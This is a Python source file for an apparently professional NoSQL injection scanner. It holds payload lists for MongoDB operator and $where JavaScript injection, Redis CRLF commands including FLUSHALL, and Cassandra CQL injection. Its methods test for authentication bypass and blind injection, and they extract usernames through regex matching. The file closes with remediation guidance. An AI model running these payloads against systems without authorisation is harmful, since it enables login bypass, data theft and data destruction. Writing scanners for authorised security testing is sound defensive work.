"""
COMPLETE Professional NoSQL Injection Scanner
Tests for MongoDB, CouchDB, Redis, Cassandra and other NoSQL injection vulnerabilities

Features:
- Authentication bypass with operator injection
- Blind NoSQL injection (timing-based and boolean-based)
- Data extraction and exfiltration
- JavaScript injection in MongoDB $where
- Array-based injection attacks
- Multi-database support (MongoDB, CouchDB, Redis, Cassandra)
- Automatic payload generation
- Context-aware testing
"""

import json
import hashlib
import asyncio
import time
import re
from typing import List, Optional, Dict, Any, Tuple
from urllib.parse import urlencode, quote
import logging

from app.models.scan import Vulnerability, SeverityLevel, VulnerabilityCategory
from app.http.client import PentestHTTPClient

logger = logging.getLogger(__name__)


class NoSQLInjectionScanner:
    """
    COMPLETE Professional NoSQL Injection Scanner

    Tests for:
    - Authentication bypass (MongoDB operator injection)
    - Blind NoSQL injection (timing-based, boolean-based)
    - Data extraction and exfiltration
    - JavaScript injection in $where clauses
    - CouchDB/Redis/Cassandra specific attacks
    - Array-based injection
    - Automatic payload generation
    """

    # MongoDB operator injection payloads for authentication bypass
    MONGODB_AUTH_BYPASS = [
        # Not equal operators
        {"$ne": None},
        {"$ne": ""},
        {"$ne": 0},
        {"$ne": -1},
        {"$ne": False},

        # Greater than operators
        {"$gt": ""},
        {"$gt": 0},
        {"$gt": -1},
        {"$gte": ""},
        {"$gte": 0},

        # Less than operators
        {"$lt": ""},
        {"$lt": 999999},

        # Regex operators
        {"$regex": ".*"},
        {"$regex": "^.*"},
        {"$regex": ".+"},
        {"$regex": "^.{1,}$"},

        # Boolean-based
        {"$or": [{"a": "a"}, {"a": "a"}]},
        {"$and": [{"a": "a"}, {"a": "a"}]},
        {"$where": "1==1"},
        {"$where": "this.password != null"},
        {"$where": "this.username != null"},

        # Injection in arrays
        {"$in": ["admin", "administrator", "root", "user"]},
        {"$nin": []},
        {"$all": []},

        # Special operators
        {"$exists": True},
        {"$type": 2},  # String type
        {"$type": 1},  # Double type
        {"$mod": [1, 0]},
    ]

    # JSON string payloads for testing
    JSON_INJECTION_PAYLOADS = [
        '{\"$ne\": null}',
        '{\"$ne\": \"\"}',
        '{\"$ne\": 0}',
        '{\"$gt\": \"\"}',
        '{\"$gte\": \"\"}',
        '{\"$regex\": \".*\"}',
        '{\"$where\": \"1==1\"}',
        '{\"$or\": [{\"a\":\"a\"}, {\"a\":\"a\"}]}',
        '{\"$exists\": true}',
        '{\"$in\": [\"admin\", \"user\"]}',
    ]

    # String-based NoSQL injection attempts
    STRING_PAYLOADS = [
        "' || '1'=='1",
        "' || 1==1//",
        "' || 1==1%00",
        "' || 1==1 --",
        "admin'||'1==1",
        "admin' || '1'=='1",
        '\' || \'1\'==\'1',
        "true, $where: '1 == 1'",
        ", $where: '1 == 1'",
        "$where: '1 == 1'",
        '\', $or: [ {}, { \'a\':\'a',
        '\' } }, { \'a\':\'a',
    ]

    # JavaScript injection payloads for $where
    JAVASCRIPT_INJECTION = [
        # Boolean bypass
        "1==1",
        "true",
        "return true",
        "this.password != null",
        "this.username != null",

        # Time-based (sleep for blind detection)
        "sleep(5000)",
        "sleep(5000) || 1==1",
        "sleep(5000); return true",
        "var d=Date.now(); while(Date.now()-d<5000){}",

        # Data extraction
        "this.password.match(/^a/)",
        "this.password.match(/^[a-z]/)",
        "this.password.length > 5",
        "this.password[0] == 'a'",

        # Error-based
        "throw new Error(JSON.stringify(this))",
        "this.password.constructor.constructor('return JSON.stringify(this)')()",
    ]

    # CouchDB specific payloads
    COUCHDB_PAYLOADS = [
        {"selector": {"_id": {"$gt": None}}},
        {"selector": {"$or": [{"_id": {"$gt": None}}, {"_id": {"$lt": "z"}}]}},
        {"selector": {"password": {"$regex": ".*"}}},
    ]

    # Redis injection payloads (command injection)
    REDIS_PAYLOADS = [
        "\\n\\r\\nKEYS *\\r\\n",
        "\\n\\r\\nGET key\\r\\n",
        "\\r\\nFLUSHALL\\r\\n",
        "\\n\\r\\nCONFIG GET *\\r\\n",
    ]

    # Cassandra CQL injection
    CASSANDRA_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1/*",
        "admin' OR '1'='1",
    ]

    def __init__(self, client: PentestHTTPClient, scan_depth: str = "balanced", progress_callback=None):
        self.client = client
        self.scan_depth = scan_depth
        self.progress_callback = progress_callback

        # Configure testing based on scan depth
        if scan_depth == "quick":
            self.mongodb_limit = 8
            self.json_limit = 5
            self.string_limit = 4
            self.javascript_limit = 3
            self.test_blind_injection = False
            self.test_data_extraction = False
            self.test_couchdb = False
            self.test_redis = False
            self.test_cassandra = False
            self.blind_timing_threshold = 3.0
            self.max_extraction_chars = 0

        elif scan_depth == "balanced":
            self.mongodb_limit = 20
            self.json_limit = 10
            self.string_limit = 8
            self.javascript_limit = 6
            self.test_blind_injection = True
            self.test_data_extraction = True
            self.test_couchdb = True
            self.test_redis = False
            self.test_cassandra = False
            self.blind_timing_threshold = 4.0
            self.max_extraction_chars = 10

        else:  # deep
            self.mongodb_limit = len(self.MONGODB_AUTH_BYPASS)
            self.json_limit = len(self.JSON_INJECTION_PAYLOADS)
            self.string_limit = len(self.STRING_PAYLOADS)
            self.javascript_limit = len(self.JAVASCRIPT_INJECTION)
            self.test_blind_injection = True
            self.test_data_extraction = True
            self.test_couchdb = True
            self.test_redis = True
            self.test_cassandra = True
            self.blind_timing_threshold = 5.0
            self.max_extraction_chars = 20

        self.vulnerabilities_found = []

    async def scan(self, endpoints: List[str]) -> List[Vulnerability]:
        """Scan for NoSQL injection vulnerabilities"""
        vulnerabilities = []
        total_endpoints = len(endpoints)

        if self.progress_callback:
            await self.progress_callback(f"🗄️  Starting COMPLETE NoSQL Injection Testing on {total_endpoints} endpoints...")
            await self.progress_callback(f"📊 Scan depth: {self.scan_depth.upper()} - Blind injection: {self.test_blind_injection}, Data extraction: {self.test_data_extraction}")

        for idx, endpoint in enumerate(endpoints, 1):
            if self.progress_callback:
                await self.progress_callback(f"🔍 [{idx}/{total_endpoints}] Testing NoSQL on: {endpoint[:70]}...")

            try:
                # Phase 1: Authentication bypass via operator injection
                vulns = await self._test_json_injection(endpoint)
                vulnerabilities.extend(vulns)

                # Phase 2: Query parameter injection
                if '?' in endpoint or any(keyword in endpoint.lower() for keyword in ['login', 'auth', 'user', 'search', 'find', 'query']):
                    vulns = await self._test_param_injection(endpoint)
                    vulnerabilities.extend(vulns)

                # Phase 3: POST body injection
                vulns = await self._test_post_injection(endpoint)
                vulnerabilities.extend(vulns)

                # Phase 4: Blind NoSQL injection (timing and boolean)
                if self.test_blind_injection and not vulnerabilities:
                    vulns = await self._test_blind_injection(endpoint)
                    vulnerabilities.extend(vulns)

                # Phase 5: JavaScript injection in $where
                if 'login' in endpoint.lower() or 'auth' in endpoint.lower():
                    vulns = await self._test_javascript_injection(endpoint)
                    vulnerabilities.extend(vulns)

                # Phase 6: Data extraction (if auth bypass found)
                if self.test_data_extraction and vulnerabilities:
                    extracted_data = await self._test_data_extraction(endpoint)
                    if extracted_data:
                        if self.progress_callback:
                            await self.progress_callback(f"💎 Extracted data from {endpoint[:60]}: {extracted_data[:100]}...")

                # Phase 7: Database-specific tests
                if self.test_couchdb:
                    vulns = await self._test_couchdb_injection(endpoint)
                    vulnerabilities.extend(vulns)

                if self.test_redis:
                    vulns = await self._test_redis_injection(endpoint)
                    vulnerabilities.extend(vulns)

                if self.test_cassandra:
                    vulns = await self._test_cassandra_injection(endpoint)
                    vulnerabilities.extend(vulns)

                if vulnerabilities and self.progress_callback:
                    vuln_count = len([v for v in vulnerabilities if v.affected_url == endpoint])
                    if vuln_count > 0:
                        await self.progress_callback(f"✅ Found {vuln_count} NoSQL vulnerability(ies) on {endpoint[:60]}")

            except Exception as e:
                logger.error(f"Error testing NoSQL injection on {endpoint}: {e}")
                if self.progress_callback:
                    await self.progress_callback(f"⚠️  Error testing NoSQL on {endpoint[:60]}: {str(e)[:50]}")

        if self.progress_callback:
            await self.progress_callback(f"🎯 NoSQL Injection scan complete: Found {len(vulnerabilities)} vulnerabilities total")

        return vulnerabilities

    async def _test_json_injection(self, endpoint: str) -> List[Vulnerability]:
        """Test for NoSQL injection via JSON payloads (authentication bypass)"""
        vulnerabilities = []

        try:
            # Get baseline response with normal data
            baseline_data = {"username": "nonexistentuser123xyz", "password": "wrongpassword123xyz"}
            baseline_response = await self.client.post(endpoint, json=baseline_data)
            baseline_status = baseline_response.status_code if hasattr(baseline_response, 'status_code') else 0

            if self.progress_callback:
                await self.progress_callback(f"  → Testing MongoDB operator injection (baseline: {baseline_status})...")

            # Test MongoDB operator payloads in username
            for idx, payload_dict in enumerate(self.MONGODB_AUTH_BYPASS[:self.mongodb_limit], 1):
                # Test in username field
                test_data = {"username": payload_dict, "password": "test"}
                response = await self.client.post(endpoint, json=test_data)

                if await self._is_successful_injection(response, baseline_response, baseline_status):
                    operator = list(payload_dict.keys())[0]
                    vulnerabilities.append(self._create_vulnerability(
                        endpoint=endpoint,
                        payload=json.dumps(test_data, indent=2),
                        injection_point="JSON Body - username field",
                        description=f"NoSQL injection successful using MongoDB operator '{operator}'. The application accepted the malicious operator and bypassed authentication. This allows attackers to log in without valid credentials.",
                        poc=f"Payload: {json.dumps(test_data)}\n\nResponse status changed from {baseline_status} to {response.status_code if hasattr(response, 'status_code') else 'N/A'}, indicating successful authentication bypass.",
                        severity=SeverityLevel.CRITICAL,
                        attack_type="Authentication Bypass"
                    ))
                    logger.warning(f"NoSQL injection found on {endpoint} with operator: {operator}")

                    if self.progress_callback:
                        await self.progress_callback(f"  ✓ Auth bypass successful with {operator} operator")
                    break

                # Test in password field
                test_data = {"username": "admin", "password": payload_dict}
                response = await self.client.post(endpoint, json=test_data)

                if await self._is_successful_injection(response, baseline_response, baseline_status):
                    operator = list(payload_dict.keys())[0]
                    vulnerabilities.append(self._create_vulnerability(
                        endpoint=endpoint,
                        payload=json.dumps(test_data, indent=2),
                        injection_point="JSON Body - password field",
                        description=f"NoSQL injection successful using MongoDB operator '{operator}' in password field. Authentication bypassed using common username 'admin'.",
                        poc=f"Payload: {json.dumps(test_data)}\n\nSuccessfully authenticated as 'admin' without knowing the password.",
                        severity=SeverityLevel.CRITICAL,
                        attack_type="Authentication Bypass"
                    ))
                    logger.warning(f"NoSQL injection found on {endpoint} in password field")

                    if self.progress_callback:
                        await self.progress_callback(f"  ✓ Password bypass successful with {operator} operator")
                    break

                # Small delay to avoid rate limiting
                if idx % 5 == 0:
                    await asyncio.sleep(0.1)

        except Exception as e:
            logger.debug(f"JSON injection test failed on {endpoint}: {e}")

        return vulnerabilities

    async def _test_param_injection(self, endpoint: str) -> List[Vulnerability]:
        """Test for NoSQL injection via query parameters"""
        vulnerabilities = []

        try:
            # Parse URL to extract parameters
            if '?' in endpoint:
                base_url, query_string = endpoint.split('?', 1)
                params = dict([p.split('=', 1) for p in query_string.split('&') if '=' in p])
            else:
                # Try common parameters
                base_url = endpoint
                params = {"user": "test", "id": "1", "search": "test", "username": "user"}

            # Get baseline response
            baseline_response = await self.client.get(base_url, params=params)
            baseline_status = baseline_response.status_code if hasattr(baseline_response, 'status_code') else 0

            if self.progress_callback:
                await self.progress_callback(f"  → Testing query parameter injection on {len(params)} params...")

            # Test each parameter
            for param_name, original_value in list(params.items())[:4]:
                # Test with JSON string operators
                for json_payload in self.JSON_INJECTION_PAYLOADS[:self.json_limit]:
                    test_params = params.copy()
                    test_params[param_name] = json_payload

                    response = await self.client.get(base_url, params=test_params)

                    if await self._is_successful_injection(response, baseline_response, baseline_status):
                        vulnerabilities.append(self._create_vulnerability(
                            endpoint=endpoint,
                            payload=f"{param_name}={json_payload}",
                            injection_point=f"Query Parameter - {param_name}",
                            description=f"NoSQL injection successful in query parameter '{param_name}' using MongoDB operator. The server processed the NoSQL operator from the URL parameter.",
                            poc=f"Original: {param_name}={original_value}\nInjected: {param_name}={json_payload}\n\nServer accepted and processed the MongoDB operator, potentially exposing unauthorized data.",
                            severity=SeverityLevel.HIGH,
                            attack_type="Query Parameter Injection"
                        ))
                        logger.warning(f"NoSQL injection found in parameter {param_name} on {endpoint}")

                        if self.progress_callback:
                            await self.progress_callback(f"  ✓ Parameter '{param_name}' vulnerable to NoSQL injection")
                        break

                # Test with string-based payloads
                for string_payload in self.STRING_PAYLOADS[:self.string_limit]:
                    test_params = params.copy()
                    test_params[param_name] = string_payload

                    response = await self.client.get(base_url, params=test_params)

                    if await self._is_successful_injection(response, baseline_response, baseline_status):
                        vulnerabilities.append(self._create_vulnerability(
                            endpoint=endpoint,
                            payload=f"{param_name}={string_payload}",
                            injection_point=f"Query Parameter - {param_name}",
                            description=f"NoSQL injection successful using string-based payload in parameter '{param_name}'. This suggests the application is vulnerable to NoSQL query manipulation.",
                            poc=f"Payload '{string_payload}' in parameter '{param_name}' altered application behavior significantly.",
                            severity=SeverityLevel.HIGH,
                            attack_type="String-Based Injection"
                        ))
                        logger.warning(f"NoSQL string injection found in {param_name} on {endpoint}")
                        break

                await asyncio.sleep(0.05)

        except Exception as e:
            logger.debug(f"Parameter injection test failed on {endpoint}: {e}")

        return vulnerabilities

    async def _test_post_injection(self, endpoint: str) -> List[Vulnerability]:
        """Test for NoSQL injection in POST body with various content types"""
        vulnerabilities = []

        try:
            # Test with application/x-www-form-urlencoded
            baseline_data = {"username": "testuser", "password": "testpass"}
            baseline_response = await self.client.post(endpoint, data=baseline_data)
            baseline_status = baseline_response.status_code if hasattr(baseline_response, 'status_code') else 0

            if self.progress_callback:
                await self.progress_callback(f"  → Testing POST form data injection...")

            # Test form data with MongoDB operators (as strings)
            for json_string in self.JSON_INJECTION_PAYLOADS[:self.json_limit]:
                test_data = {"username": json_string, "password": "test"}
                response = await self.client.post(endpoint, data=test_data)

                if await self._is_successful_injection(response, baseline_response, baseline_status):
                    vulnerabilities.append(self._create_vulnerability(
                        endpoint=endpoint,
                        payload=f"username={json_string}",
                        injection_point="POST Form Data - username",
                        description="NoSQL injection successful in form-encoded POST data. The application parses form data and interprets MongoDB operators from string values.",
                        poc=f"Submitted form data with MongoDB operator as string: {json_string}\n\nServer processed the operator, indicating vulnerable parameter parsing.",
                        severity=SeverityLevel.CRITICAL,
                        attack_type="POST Form Injection"
                    ))
                    logger.warning(f"NoSQL injection in POST form data on {endpoint}")

                    if self.progress_callback:
                        await self.progress_callback(f"  ✓ POST form data vulnerable to NoSQL injection")
                    break

                await asyncio.sleep(0.05)

        except Exception as e:
            logger.debug(f"POST injection test failed on {endpoint}: {e}")

        return vulnerabilities

    async def _test_blind_injection(self, endpoint: str) -> List[Vulnerability]:
        """Test for blind NoSQL injection using timing and boolean-based techniques"""
        vulnerabilities = []

        if self.progress_callback:
            await self.progress_callback(f"  → Testing blind NoSQL injection (timing-based)...")

        try:
            # Timing-based blind injection
            vuln = await self._test_timing_based_injection(endpoint)
            if vuln:
                vulnerabilities.append(vuln)
                if self.progress_callback:
                    await self.progress_callback(f"  ✓ Timing-based blind injection confirmed")

            # Boolean-based blind injection
            if not vulnerabilities:
                if self.progress_callback:
                    await self.progress_callback(f"  → Testing boolean-based blind injection...")

                vuln = await self._test_boolean_based_injection(endpoint)
                if vuln:
                    vulnerabilities.append(vuln)
                    if self.progress_callback:
                        await self.progress_callback(f"  ✓ Boolean-based blind injection confirmed")

        except Exception as e:
            logger.debug(f"Blind injection test failed on {endpoint}: {e}")

        return vulnerabilities

    async def _test_timing_based_injection(self, endpoint: str) -> Optional[Vulnerability]:
        """Test for timing-based blind NoSQL injection"""
        try:
            # Baseline timing
            baseline_times = []
            for _ in range(3):
                start = time.time()
                await self.client.post(endpoint, json={"username": "test", "password": "test"})
                baseline_times.append(time.time() - start)

            baseline_avg = sum(baseline_times) / len(baseline_times)

            # Test with sleep injection in $where
            sleep_payloads = [
                {"username": {"$where": f"sleep({int(self.blind_timing_threshold * 1000)})"}, "password": "test"},
                {"username": "admin", "password": {"$where": f"sleep({int(self.blind_timing_threshold * 1000)})"}},
                {"username": {"$regex": ".*", "$where": f"sleep({int(self.blind_timing_threshold * 1000)})"}, "password": "test"},
            ]

            for payload in sleep_payloads:
                start = time.time()
                response = await self.client.post(endpoint, json=payload)
                elapsed = time.time() - start

                # If response takes significantly longer, timing injection works
                if elapsed > baseline_avg + self.blind_timing_threshold:
                    return self._create_vulnerability(
                        endpoint=endpoint,
                        payload=json.dumps(payload, indent=2),
                        injection_point="JSON Body - Timing-Based Blind",
                        description=f"Blind NoSQL injection confirmed via timing analysis. The application executed a sleep command injected through MongoDB $where clause, causing a {elapsed:.2f}s delay (baseline: {baseline_avg:.2f}s). This indicates code execution is possible.",
                        poc=f"Payload: {json.dumps(payload)}\n\nBaseline response time: {baseline_avg:.2f}s\nInjected response time: {elapsed:.2f}s\nDelay: {elapsed - baseline_avg:.2f}s\n\nThis confirms the server executes JavaScript in $where clauses.",
                        severity=SeverityLevel.CRITICAL,
                        attack_type="Timing-Based Blind Injection"
                    )

                await asyncio.sleep(0.1)

        except Exception as e:
            logger.debug(f"Timing-based injection test error: {e}")

        return None

    async def _test_boolean_based_injection(self, endpoint: str) -> Optional[Vulnerability]:
        """Test for boolean-based blind NoSQL injection"""
        try:
            # Test with true condition
            true_payload = {"username": {"$where": "1==1"}, "password": "test"}
            true_response = await self.client.post(endpoint, json=true_payload)
            true_status = true_response.status_code if hasattr(true_response, 'status_code') else 0
            true_length = len(true_response.content) if hasattr(true_response, 'content') else 0

            # Test with false condition
            false_payload = {"username": {"$where": "1==2"}, "password": "test"}
            false_response = await self.client.post(endpoint, json=false_payload)
            false_status = false_response.status_code if hasattr(false_response, 'status_code') else 0
            false_length = len(false_response.content) if hasattr(false_response, 'content') else 0

            # If responses differ significantly, boolean injection works
            if (true_status != false_status) or (abs(true_length - false_length) > 50):
                return self._create_vulnerability(
                    endpoint=endpoint,
                    payload=f"True: {json.dumps(true_payload)}\nFalse: {json.dumps(false_payload)}",
                    injection_point="JSON Body - Boolean-Based Blind",
                    description="Blind NoSQL injection confirmed via boolean-based analysis. The application responds differently to true (1==1) vs false (1==2) conditions in MongoDB $where clause, enabling data extraction through binary search.",
                    poc=f"True condition (1==1):\n  Status: {true_status}, Length: {true_length}\n\nFalse condition (1==2):\n  Status: {false_status}, Length: {false_length}\n\nDifferent responses confirm boolean-based blind injection is possible.",
                    severity=SeverityLevel.HIGH,
                    attack_type="Boolean-Based Blind Injection"
                )

        except Exception as e:
            logger.debug(f"Boolean-based injection test error: {e}")

        return None

    async def _test_javascript_injection(self, endpoint: str) -> List[Vulnerability]:
        """Test for JavaScript code injection in MongoDB $where clauses"""
        vulnerabilities = []

        if self.progress_callback:
            await self.progress_callback(f"  → Testing JavaScript injection in $where...")

        try:
            baseline_data = {"username": "test", "password": "test"}
            baseline_response = await self.client.post(endpoint, json=baseline_data)
            baseline_status = baseline_response.status_code if hasattr(baseline_response, 'status_code') else 0

            for js_code in self.JAVASCRIPT_INJECTION[:self.javascript_limit]:
                # Test in username
                test_data = {"username": {"$where": js_code}, "password": "test"}
                response = await self.client.post(endpoint, json=test_data)

                if await self._is_successful_injection(response, baseline_response, baseline_status):
                    vulnerabilities.append(self._create_vulnerability(
                        endpoint=endpoint,
                        payload=json.dumps(test_data, indent=2),
                        injection_point="JSON Body - $where JavaScript Injection",
                        description=f"JavaScript code injection successful in MongoDB $where clause. The application executed arbitrary JavaScript: '{js_code}'. This can lead to authentication bypass, data exfiltration, or even remote code execution.",
                        poc=f"Payload: {json.dumps(test_data)}\n\nThe server executed the JavaScript code, proving arbitrary code execution in the database context.",
                        severity=SeverityLevel.CRITICAL,
                        attack_type="JavaScript Injection"
                    ))
                    logger.warning(f"JavaScript injection found on {endpoint}")

                    if self.progress_callback:
                        await self.progress_callback(f"  ✓ JavaScript injection confirmed: {js_code[:50]}")
                    break

                await asyncio.sleep(0.05)

        except Exception as e:
            logger.debug(f"JavaScript injection test failed: {e}")

        return vulnerabilities

    async def _test_data_extraction(self, endpoint: str) -> Optional[str]:
        """Attempt to extract data after successful authentication bypass"""
        if not self.test_data_extraction:
            return None

        if self.progress_callback:
            await self.progress_callback(f"  → Attempting data extraction...")

        try:
            # Try to extract username using regex matching
            extracted_chars = []
            charset = "abcdefghijklmnopqrstuvwxyz0123456789_-"

            for position in range(self.max_extraction_chars):
                for char in charset:
                    # Build regex to match character at position
                    regex_pattern = f"^{'.' * position}{char}"

                    test_data = {
                        "username": {"$regex": regex_pattern},
                        "password": {"$ne": ""}
                    }

                    response = await self.client.post(endpoint, json=test_data)

                    # If successful, this character matches
                    if hasattr(response, 'status_code') and response.status_code in [200, 201, 302]:
                        response_text = response.text.lower() if hasattr(response, 'text') else ''
                        if any(indicator in response_text for indicator in ['success', 'welcome', 'token', 'dashboard']):
                            extracted_chars.append(char)
                            if self.progress_callback:
                                await self.progress_callback(f"    → Extracted: {''.join(extracted_chars)}")
                            break

                    await asyncio.sleep(0.02)

                # If no character matched, we're done
                if len(extracted_chars) != position + 1:
                    break

            if extracted_chars:
                extracted_username = ''.join(extracted_chars)
                logger.info(f"Extracted username: {extracted_username}")
                return extracted_username

        except Exception as e:
            logger.debug(f"Data extraction failed: {e}")

        return None

    async def _test_couchdb_injection(self, endpoint: str) -> List[Vulnerability]:
        """Test for CouchDB-specific NoSQL injection"""
        vulnerabilities = []

        if self.progress_callback:
            await self.progress_callback(f"  → Testing CouchDB-specific injection...")

        try:
            for payload in self.COUCHDB_PAYLOADS:
                response = await self.client.post(endpoint, json=payload)

                if hasattr(response, 'status_code') and response.status_code in [200, 201]:
                    response_text = response.text if hasattr(response, 'text') else ''

                    # Check for CouchDB-specific response indicators
                    if any(indicator in response_text for indicator in ['"rows":', '"docs":', '"id":', '_rev']):
                        vulnerabilities.append(self._create_vulnerability(
                            endpoint=endpoint,
                            payload=json.dumps(payload, indent=2),
                            injection_point="JSON Body - CouchDB Selector",
                            description="CouchDB NoSQL injection successful. The application accepted a malicious CouchDB selector query, potentially exposing all database documents.",
                            poc=f"Payload: {json.dumps(payload)}\n\nServer returned CouchDB-formatted data, confirming the injection.",
                            severity=SeverityLevel.HIGH,
                            attack_type="CouchDB Injection"
                        ))
                        logger.warning(f"CouchDB injection found on {endpoint}")

                        if self.progress_callback:
                            await self.progress_callback(f"  ✓ CouchDB injection confirmed")
                        break

                await asyncio.sleep(0.1)

        except Exception as e:
            logger.debug(f"CouchDB injection test failed: {e}")

        return vulnerabilities

    async def _test_redis_injection(self, endpoint: str) -> List[Vulnerability]:
        """Test for Redis command injection"""
        vulnerabilities = []

        if self.progress_callback:
            await self.progress_callback(f"  → Testing Redis command injection...")

        try:
            for payload in self.REDIS_PAYLOADS:
                # Try in various contexts
                test_cases = [
                    {"key": payload},
                    {"username": payload},
                    {"id": payload},
                ]

                for test_data in test_cases:
                    response = await self.client.post(endpoint, json=test_data)

                    if hasattr(response, 'text'):
                        response_text = response.text

                        # Check for Redis command execution indicators
                        if any(indicator in response_text for indicator in ['PONG', '+OK', '*', '$', 'redis']):
                            vulnerabilities.append(self._create_vulnerability(
                                endpoint=endpoint,
                                payload=json.dumps(test_data, indent=2),
                                injection_point="JSON Body - Redis Command",
                                description="Redis command injection successful. The application executed Redis protocol commands, potentially allowing full database access or manipulation.",
                                poc=f"Payload: {json.dumps(test_data)}\n\nServer executed Redis commands, as evidenced by Redis protocol responses.",
                                severity=SeverityLevel.CRITICAL,
                                attack_type="Redis Command Injection"
                            ))
                            logger.warning(f"Redis injection found on {endpoint}")

                            if self.progress_callback:
                                await self.progress_callback(f"  ✓ Redis command injection confirmed")
                            return vulnerabilities

                    await asyncio.sleep(0.1)

        except Exception as e:
            logger.debug(f"Redis injection test failed: {e}")

        return vulnerabilities

    async def _test_cassandra_injection(self, endpoint: str) -> List[Vulnerability]:
        """Test for Cassandra CQL injection"""
        vulnerabilities = []

        if self.progress_callback:
            await self.progress_callback(f"  → Testing Cassandra CQL injection...")

        try:
            baseline_data = {"username": "test", "password": "test"}
            baseline_response = await self.client.post(endpoint, json=baseline_data)
            baseline_status = baseline_response.status_code if hasattr(baseline_response, 'status_code') else 0

            for payload in self.CASSANDRA_PAYLOADS:
                test_data = {"username": payload, "password": "test"}
                response = await self.client.post(endpoint, json=test_data)

                if await self._is_successful_injection(response, baseline_response, baseline_status):
                    vulnerabilities.append(self._create_vulnerability(
                        endpoint=endpoint,
                        payload=json.dumps(test_data, indent=2),
                        injection_point="JSON Body - Cassandra CQL",
                        description="Cassandra CQL injection successful. The application is vulnerable to CQL injection, similar to SQL injection in relational databases.",
                        poc=f"Payload: {json.dumps(test_data)}\n\nInjection altered query logic, confirming CQL injection vulnerability.",
                        severity=SeverityLevel.HIGH,
                        attack_type="Cassandra CQL Injection"
                    ))
                    logger.warning(f"Cassandra injection found on {endpoint}")

                    if self.progress_callback:
                        await self.progress_callback(f"  ✓ Cassandra CQL injection confirmed")
                    break

                await asyncio.sleep(0.1)

        except Exception as e:
            logger.debug(f"Cassandra injection test failed: {e}")

        return vulnerabilities

    async def _is_successful_injection(self, response: Any, baseline_response: Any, baseline_status: int) -> bool:
        """Determine if injection was successful based on response differences"""
        if not response:
            return False

        try:
            current_status = response.status_code if hasattr(response, 'status_code') else 0

            # Success indicator 1: Status code changed from auth failure to success
            if baseline_status in [401, 403, 404] and current_status in [200, 201, 302, 303]:
                return True

            # Success indicator 2: Status code changed from 4xx to 2xx
            if 400 <= baseline_status < 500 and 200 <= current_status < 300:
                return True

            # Success indicator 3: Response contains success indicators
            if hasattr(response, 'text'):
                response_text = response.text.lower()
                success_indicators = [
                    'success', 'welcome', 'dashboard', 'token', 'session',
                    'authenticated', 'logged in', 'login successful', 'access granted',
                    '"user":', '"admin":', '"role":', '"jwt":', '"bearer"'
                ]
                error_indicators = [
                    'invalid', 'error', 'failed', 'incorrect', 'wrong',
                    'denied', 'unauthorized', 'forbidden'
                ]

                # Check baseline for errors
                baseline_text = baseline_response.text.lower() if hasattr(baseline_response, 'text') else ''
                baseline_has_error = any(err in baseline_text for err in error_indicators)
                response_has_success = any(suc in response_text for suc in success_indicators)

                # If baseline had errors but injection response has success
                if baseline_has_error and response_has_success:
                    return True

                # If baseline had no success but injection has success
                baseline_has_success = any(suc in baseline_text for suc in success_indicators)
                if not baseline_has_success and response_has_success:
                    return True

            # Success indicator 4: Response size significantly different (data leak)
            if hasattr(response, 'content') and hasattr(baseline_response, 'content'):
                response_size = len(response.content)
                baseline_size = len(baseline_response.content)

                # If response is significantly larger (more than 2x), might indicate data leak
                if response_size > baseline_size * 2 and response_size > 500:
                    return True

                # If response is much smaller, might indicate different code path
                if baseline_size > 500 and response_size < baseline_size * 0.5:
                    return True

            # Success indicator 5: Response headers contain auth tokens
            if hasattr(response, 'headers'):
                auth_headers = ['set-cookie', 'authorization', 'x-auth-token', 'x-access-token']
                for header in auth_headers:
                    if header in [h.lower() for h in response.headers.keys()]:
                        header_value = response.headers.get(header, '')
                        if any(token_ind in header_value.lower() for token_ind in ['token', 'session', 'jwt', 'bearer']):
                            return True

        except Exception as e:
            logger.debug(f"Error comparing responses: {e}")

        return False

    def _create_vulnerability(self, endpoint: str, payload: str, injection_point: str,
                            description: str, poc: str, severity: SeverityLevel,
                            attack_type: str) -> Vulnerability:
        """Create a vulnerability object for NoSQL injection"""
        vuln_id = f"nosql_{attack_type.lower().replace(' ', '_')}_{hashlib.md5((endpoint + payload).encode()).hexdigest()[:8]}"

        return Vulnerability(
            id=vuln_id,
            title=f"NoSQL Injection - {attack_type}",
            description=description,
            severity=severity,
            category=VulnerabilityCategory.INJECTION,
            affected_url=endpoint,
            affected_parameter=injection_point,
            proof_of_concept=poc,
            payload=payload,
            remediation="""
### Immediate Actions:
1. **Never construct queries from user input** - Use parameterized queries and ODM/ORM libraries
2. **Strict input validation** - Reject objects/arrays where strings are expected
3. **Type checking** - Enforce strict type validation on all inputs
4. **Disable $where operator** - If not absolutely necessary, disable JavaScript execution

### MongoDB-Specific Remediations:
- Use MongoDB's native query language properly with type-safe drivers
- Sanitize user input: reject MongoDB operators ($ne, $gt, $where, etc.) in user-controlled fields
- Use `mongo-sanitize` library for Node.js or equivalent for other languages
- Enable MongoDB authentication and use role-based access control (RBAC)
- Run MongoDB with `--noscripting` flag to disable server-side JavaScript

### General Best Practices:
- Implement allow-lists for acceptable input values
- Never use string concatenation to build queries
- Use prepared statements and parameterized queries
- Apply principle of least privilege to database accounts
- Log and monitor for injection attempts
- Keep database software updated
- Use Web Application Firewall (WAF) with NoSQL injection rules

### Code Example (Node.js):
```javascript
// VULNERABLE CODE - DON'T DO THIS
const user = await User.findOne({
    username: req.body.username,  // Attacker sends {"$ne": null}
    password: req.body.password
});

// SECURE CODE - DO THIS
const mongoSanitize = require('mongo-sanitize');
const user = await User.findOne({
    username: mongoSanitize(req.body.username),  // Sanitized
    password: mongoSanitize(req.body.password)
});

// OR use strict schema validation
const Joi = require('joi');
const schema = Joi.object({
    username: Joi.string().alphanum().min(3).max(30).required(),
    password: Joi.string().min(6).required()
});
```
            """,
            cwe_id="CWE-943",
            owasp_category="A03:2021 – Injection",
            references=[
                "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html",
                "https://book.hacktricks.xyz/pentesting-web/nosql-injection",
                "https://github.com/Charlie-belmer/nosqli",
                "https://zanon.io/posts/nosql-injection-in-mongodb",
                "https://nullsweep.com/a-nosql-injection-primer-with-mongo/",
            ]
        )
